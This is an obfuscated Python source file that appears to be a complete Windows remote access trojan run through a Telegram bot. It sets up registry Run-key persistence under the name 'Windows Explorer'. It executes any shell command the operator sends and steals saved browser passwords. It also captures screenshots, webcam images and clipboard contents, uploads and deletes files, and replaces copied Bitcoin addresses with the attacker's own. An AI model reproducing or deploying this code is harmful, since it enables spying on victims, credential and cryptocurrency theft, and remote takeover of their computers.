import time #line:1
import requests #line:3
import os #line:4
import sys #line:5
import pyautogui #line:6
import detailes #line:7
import os .path #line:8
import subprocess #line:9
import re #line:10
import platform #line:11
def move ():#line:17
    OOO0000OO00O0O0OO =os .environ ['appdata']#line:18
    OO000000O000OOOOO =os .environ ['appdata']+"\\"+os .path .basename (sys .argv [0 ])#line:19
    if not os .path .exists (OO000000O000OOOOO ):#line:20
        OOO0OOOOOO00000OO =os .path .join (OOO0000OO00O0O0OO ,os .path .basename (sys .argv [0 ]))#line:26
        subprocess .Popen (f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{OO000000O000OOOOO}"',shell =True )#line:27
        OOOOO00O0O0O0O00O =f'timeout 2 & move /y {os.path.basename(sys.argv[0])} {OOO0OOOOOO00000OO} & cd /d {OOO0OOOOOO00000OO}\\ & {OOO0OOOOOO00000OO}'#line:28
        subprocess .Popen (OOOOO00O0O0O0O00O ,shell =True )#line:29
        sys .exit (0 )#line:30
move ()#line:32
def Pcinfor ():#line:33
    OO0OO0O0O00O0O00O =os .environ ['username']#line:34
    O0O0OO0O00O000000 =platform .node ()#line:35
    O00OOO000O0000O00 ='wmic csproduct get uuid'#line:36
    O00O0O0O0000O0O0O =subprocess .Popen (O00OOO000O0000O00 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:37
    O0OO0OO0O0OO00OOO =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Bot Active: "+OO0OO0O0O00O0O00O +"\n"+"DesktopName: "+O0O0OO0O00O000000 )#line:38
def command_checker (OO000OOOO0O0OOOOO ):#line:39
    OOO000O00O0OOO0O0 =os .getenv ('username')#line:40
    OOOOOOO000O0000OO =subprocess .Popen (OO000OOOO0O0OOOOO ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:42
    OOOOOOO000O0000OO =OOOOOOO000O0000OO .stdout .read ()+OOOOOOO000O0000OO .stderr .read ()#line:43
    OOOOOOO000O0000OO =str (OOOOOOO000O0000OO ,"utf-8")#line:44
    return "Pc Username : "+OOO000O00O0OOO0O0 +"\n\n"+OOOOOOO000O0000OO #line:46
def commands (O00OOOOO00OO0OO0O ):#line:49
    OOOO0OO0O00O0O0O0 =str (os .getenv ('username'))#line:50
    OOOO00O000000OOO0 =str (O00OOOOO00OO0OO0O )#line:51
    if OOOO0OO0O00O0O0O0 in OOOO00O000000OOO0 or "getall "in OOOO00O000000OOO0 or "active"in OOOO00O000000OOO0 :#line:52
        if "getall "in OOOO00O000000OOO0 :#line:53
            OOOO00O000000OOO0 =OOOO00O000000OOO0 [7 :]#line:54
        elif OOOO00O000000OOO0 =="active":#line:55
            OOOO00O000000OOO0 =OOOO00O000000OOO0 #line:56
        else :#line:57
            O00OOO00OOOOO0000 =len (OOOO0OO0O00O0O0O0 )+1 #line:58
            OOOO00O000000OOO0 =OOOO00O000000OOO0 [O00OOO00OOOOO0000 :]#line:59
        if OOOO00O000000OOO0 =="dir":#line:60
            O00O0O0OO00O00O0O =os .path .realpath (sys .argv [0 ])#line:61
            O00OO0OOOOO0OOO0O =command_checker ("dir /b")#line:62
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O00O0O0OO00O00O0O +"\n\n"+O00OO0OOOOO0OOO0O )#line:64
        elif OOOO00O000000OOO0 =="ipconfig":#line:67
            O00OO0OOOOO0OOO0O =command_checker (OOOO00O000000OOO0 )#line:68
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O00OO0OOOOO0OOO0O )#line:70
        elif OOOO00O000000OOO0 =="allpass":#line:72
            import tempfile #line:74
            OOO00OO000O00O00O =tempfile .gettempdir ()#line:75
            try :#line:78
                "https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Please Bro Wait Collecting Information Of "#line:81
                import nomo #line:85
                O0000000O00000000 =nomo .main ()#line:86
                import telepot #line:87
                OOO0OOO00OO0OO00O =telepot .Bot (detailes .api_key )#line:88
                OOO0OOO00OO0OO00O .sendDocument (detailes .Chat_id ,document =open (OOO00OO000O00O00O +'\\BrowserData.txt','rb'))#line:91
                os .remove (OOO00OO000O00O00O +'\\BrowserData.txt')#line:92
            except :#line:93
                OOOO0OO0O00O0O0O0 =os .getenv ('username')#line:94
                O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OO0O00O0O0O0 +"'s Antivirus is enabled")#line:96
        elif OOOO00O000000OOO0 =="ss":#line:97
            import tempfile #line:98
            OOOOOO00000OOO000 =tempfile .gettempdir ()#line:99
            O000OOOOO00O00OOO =pyautogui .screenshot ()#line:100
            O000OOOOO00O00OOO .save (OOOOOO00000OOO000 +'\\screenshot_1.png')#line:101
            import telepot #line:102
            OOO0OOO00OO0OO00O =telepot .Bot (detailes .api_key )#line:103
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OO0O00O0O0O0 )#line:107
            OOO0OOO00OO0OO00O .sendDocument (detailes .Chat_id ,document =open (OOOOOO00000OOO000 +'\\screenshot_1.png','rb'))#line:109
            OOOO0OO0O00O0O0O0 =os .getenv ('username')#line:110
            os .remove (OOOOOO00000OOO000 +'\\screenshot_1.png')#line:111
        elif "cd "in OOOO00O000000OOO0 :#line:112
            O0O0OO00O00O00O0O =OOOO00O000000OOO0 [3 :]#line:113
            os .chdir (O0O0OO00O00O00O0O )#line:114
            O0O00O00OO00OOOOO =command_checker ("echo %cd%")#line:115
            O0000000O00000000 =command_checker ("dir /b")#line:116
            O0000000O00000000 =O0O00O00OO00OOOOO +"\n\n"+O0000000O00000000 #line:117
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0000000O00000000 )#line:119
        elif "cd .."==OOOO00O000000OOO0 :#line:120
            os .chdir (OOOO00O000000OOO0 [3 :])#line:121
            O0O00O00OO00OOOOO =command_checker ("echo %cd%")#line:122
            O0000000O00000000 =command_checker ("dir /b")#line:123
            O0OOO000O0000OOOO =O0O00O00OO00OOOOO +"\n\n"+O0000000O00000000 #line:124
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0OOO000O0000OOOO )#line:126
        elif "download "in OOOO00O000000OOO0 :#line:128
            try :#line:129
                import telepot #line:130
                OOO0OOO00OO0OO00O =telepot .Bot (detailes .api_key )#line:131
                OOOO00O000000OOO0 =OOOO00O000000OOO0 [9 :]#line:132
                O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Wait sending the file")#line:134
                OOO0OOO00OO0OO00O .sendDocument (detailes .Chat_id ,document =open (OOOO00O000000OOO0 ,'rb'))#line:135
            except :#line:136
                O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=File Not Found")#line:138
        elif OOOO00O000000OOO0 =="clip":#line:140
            O0000000O00000000 =subprocess .Popen ('powershell -command "Get-Clipboard"',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:141
            O0000000O00000000 =O0000000O00000000 .stdout .read ()+O0000000O00000000 .stderr .read ()#line:142
            O0000000O00000000 =str (O0000000O00000000 ,"utf-8")#line:143
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0000000O00000000 )#line:145
        elif OOOO00O000000OOO0 =="exit":#line:146
            sys .exit (0 )#line:147
        elif "zip "in OOOO00O000000OOO0 :#line:148
            OOOO00O000000OOO0 =OOOO00O000000OOO0 [3 :]#line:149
            OOOOO00OOOOO00O0O ="tar.exe -a -cf"+OOOO00O000000OOO0 #line:150
            subprocess .Popen (OOOOO00OOOOO00O0O ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:151
            O00O0O0OO00O00O0O =os .path .realpath (sys .argv [0 ])#line:152
            O00OO0OOOOO0OOO0O =command_checker ("dir /b")#line:153
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O00O0O0OO00O00O0O +"\n\n"+O00OO0OOOOO0OOO0O )#line:155
        elif "delete "in OOOO00O000000OOO0 :#line:156
            if os .path .exists (OOOO00O000000OOO0 [7 :]):#line:157
                if os .path .isdir (OOOO00O000000OOO0 [7 :]):#line:158
                    OOOOO00OOOOO00O0O =subprocess .Popen ("rmdir /s /q "+OOOO00O000000OOO0 [7 :],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:160
                    O00O0O0OO00O00O0O =command_checker ("echo %cd%")#line:161
                    time .sleep (1 )#line:162
                    O00OO0OOOOO0OOO0O =command_checker ("dir /b")#line:163
                    O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O00O0O0OO00O00O0O +"\n\n"+"Folder Deleted Successfully \n"+O00OO0OOOOO0OOO0O )#line:165
                else :#line:166
                    OOOOO00OOOOO00O0O =subprocess .Popen ("del "+OOOO00O000000OOO0 [7 :],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:167
                    O00O0O0OO00O00O0O =command_checker ("echo %cd%")#line:168
                    time .sleep (1 )#line:169
                    O00OO0OOOOO0OOO0O =command_checker ("dir /b")#line:170
                    O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O00O0O0OO00O00O0O +"\n\n"+"File Deleted Successfully \n"+O00OO0OOOOO0OOO0O )#line:171
            else :#line:172
                O00O0O0OO00O00O0O =os .path .realpath (sys .argv [0 ])#line:173
                O00OO0OOOOO0OOO0O =command_checker ("dir /b")#line:174
                O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Pc Name: "+OOOO0OO0O00O0O0O0 +"\n"+"Cannot Delete")#line:175
        elif OOOO00O000000OOO0 =="active":#line:176
            Pcinfor ()#line:177
        elif OOOO00O000000OOO0 =="webcam":#line:178
            from cv2 import VideoCapture #line:180
            from cv2 import imwrite #line:181
            from cv2 import waitKey #line:182
            O0OO000OOOOO0O0OO =0 #line:186
            OOO0OO000OOO0OOO0 =VideoCapture (O0OO000OOOOO0O0OO )#line:187
            O0000000O00000000 ,OO00000000O0OOO0O =OOO0OO000OOO0OOO0 .read ()#line:190
            import tempfile #line:194
            OOOOOO00000OOO000 =tempfile .gettempdir ()#line:195
            if O0000000O00000000 :#line:196
                imwrite (OOOOOO00000OOO000 +"\\webpic.png",OO00000000O0OOO0O )#line:203
                waitKey (0 )#line:207
                import telepot #line:208
                OOO0OOO00OO0OO00O =telepot .Bot (detailes .api_key )#line:209
                O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+OOOO0OO0O00O0O0O0 )#line:213
                OOO0OOO00OO0OO00O .sendDocument (detailes .Chat_id ,document =open (OOOOOO00000OOO000 +'\\webpic.png','rb'))#line:215
                os .remove (OOOOOO00000OOO000 +'\\webpic.png')#line:216
            else :#line:220
                print ("No image detected. Please! try again")#line:221
        else :#line:222
            O0000000O00000000 =subprocess .Popen (OOOO00O000000OOO0 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:223
            O0000000O00000000 =O0000000O00000000 .stdout .read ()+O0000000O00000000 .stderr .read ()#line:224
            O0000000O00000000 =str (O0000000O00000000 ,"utf-8")#line:225
            O0000000O0O00OO00 =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text="+O0000000O00000000 )#line:227
def btcs ():#line:228
    from hashlib import sha256 #line:229
    import subprocess #line:230
    import detailes #line:231
    OOOOO0OOO00OO0O00 ='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'#line:232
    OOOOO0OO0OOOOO000 =str (os .getenv ('username'))#line:233
    def O0O00O00O00000O0O (O0O0O0000OOO00OO0 ,OO0O00OOOOO0OO0O0 ):#line:234
        OOO0OOO0O00OO000O =0 #line:235
        for O0OOOO000O0OOO0OO in O0O0O0000OOO00OO0 :#line:236
            OOO0OOO0O00OO000O =OOO0OOO0O00OO000O *58 +OOOOO0OOO00OO0O00 .index (O0OOOO000O0OOO0OO )#line:237
        return OOO0OOO0O00OO000O .to_bytes (OO0O00OOOOO0OO0O0 ,'big')#line:238
    def OO0OOOOOO0O0O0O00 (OO000OO0000000OO0 ):#line:241
        try :#line:242
            O0OOO0O00OO00OO00 =O0O00O00O00000O0O (OO000OO0000000OO0 ,25 )#line:243
            return O0OOO0O00OO00OO00 [-4 :]==sha256 (sha256 (O0OOO0O00OO00OO00 [:-4 ]).digest ()).digest ()[:4 ]#line:244
        except Exception :#line:245
            return False #line:246
    OOOO0OO00O000OOOO =subprocess .Popen ('powershell -command "Get-Clipboard"',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:249
    OOOO0OO00O000OOOO =OOOO0OO00O000OOOO .stdout .read ()+OOOO0OO00O000OOOO .stderr .read ()#line:250
    OOOO0OO00O000OOOO =str (OOOO0OO00O000OOOO .strip (),"utf-8")#line:251
    if '#'in OOOO0OO00O000OOOO or '('in OOOO0OO00O000OOOO or ')'in OOOO0OO00O000OOOO or '{'in OOOO0OO00O000OOOO or '}'in OOOO0OO00O000OOOO or '['in OOOO0OO00O000OOOO or ']'in OOOO0OO00O000OOOO or '"'in OOOO0OO00O000OOOO or "'"in OOOO0OO00O000OOOO :#line:252
        OOOO0OO00O000OOOO ='1'#line:253
    else :#line:254
        OOO0O00000O00OO00 =OO0OOOOOO0O0O0O00 (OOOO0OO00O000OOOO )#line:255
        if OOO0O00000O00OO00 ==True :#line:256
            O0OO000O000OO0O00 ='echo '+detailes .bitcoin +'| clip'#line:257
            subprocess .Popen (O0OO000O000OO0O00 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:258
            OO00O0O00000OOO0O =requests .post ("https://api.telegram.org/bot"+detailes .api_key +"/sendMessage?chat_id="+detailes .Chat_id +"&text=Bit Coin Addreas Changed\nFrom: "+OOOO0OO00O000OOOO +"\nTo: "+detailes .bitcoin +"\nDesktopName: "+OOOOO0OO0OOOOO000 )#line:259
        else :#line:260
            pass #line:261
Pcinfor ()#line:262
import tempfile #line:263
tempDick =tempfile .gettempdir ()#line:264
while True :#line:266
    try :#line:267
        btcs ()#line:268
        idfile_read =None #line:269
        url ="https://api.telegram.org/bot"+detailes .api_key +"/getUpdates?offset=-1"#line:270
        v =requests .get (url ).text #line:271
        massage_id =re .search ('"message_id":(.*),"from"',v )#line:274
        massage_id_ =massage_id .group (1 )#line:275
        if "/"in v or "zip "in v or " download "in v or ".py"in v or ".zip"in v :#line:277
            text =re .search ('"text":"(.*)","e',v )#line:278
            text_ =text .group (1 )#line:279
        else :#line:281
            text =re .search ('"text":"(.*)"}}]}',v )#line:282
            text_ =text .group (1 )#line:283
        try :#line:285
            idfile =open (tempDick +"\\id.txt","r")#line:286
            idfile_read =idfile .read ()#line:287
            idfile .close ()#line:288
        except :#line:289
            pass #line:290
        if massage_id_ ==idfile_read :#line:291
            pass #line:292
        elif idfile_read ==None :#line:293
            pass #line:294
        else :#line:295
            commands (text_ )#line:297
        idfile =open (tempDick +"\\id.txt","w")#line:298
        idfile .write (massage_id_ )#line:299
        idfile .close ()#line:300
    except Exception as e :#line:301
        print (e )#line:302
        time .sleep (2 )#line:303
